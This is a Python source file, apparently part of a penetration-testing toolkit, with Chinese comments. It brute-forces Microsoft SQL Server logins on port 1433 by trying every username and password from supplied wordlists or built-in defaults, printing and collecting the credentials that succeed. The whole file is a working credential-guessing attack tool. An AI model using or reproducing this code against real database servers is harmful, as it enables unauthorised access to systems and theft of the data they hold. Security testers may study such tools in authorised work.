import mssql
from config import *

def brute_force(host,user,pwd):
    userdict = dict()
    # 连接数据库，设置超时时间10秒
    conn = mssql.connect(host=host,user=user,password=pwd,timeout=10)

    # 判断是否成功连接，成功则返回True
    if conn:
        print(f"[+] 登录成功：{user}@{host}:1433，密码：{pwd}")
        userdict[user] = pwd
        conn.close()
    else:
       print(f"[-] 登录失败：{user}@{host}:1433，密码：{pwd}")
    return userdict

def mssqlCrack(ip:str, userfile:str, passwdfile:str):
    userdict = dict()
    userlist = []
    passwdlist = []
    if not ip:
        return dict()
    if userfile:    # 是否采用指定字典文件
        with open(userfile, "r") as f1:
            userlist = f1.readlines()
            for i in range(len(userlist)):
                userlist[i] = userlist[i].strip()
    if passwdfile:
        with open(passwdfile, "r") as f2:
            passwdlist = f2.readlines()
            for i in range(len(passwdlist)):
                passwdlist[i] = passwdlist[i].strip()
    if not userlist:
        for user in Userdict['mssql']:
            userlist.append(user)
    if not passwdlist:
        passwdlist = Passwords
    #print(userlist, passwdlist)
    for username in userlist:
        for password in passwdlist:
            userdict.update(brute_force(ip, username, password))
    return userdict
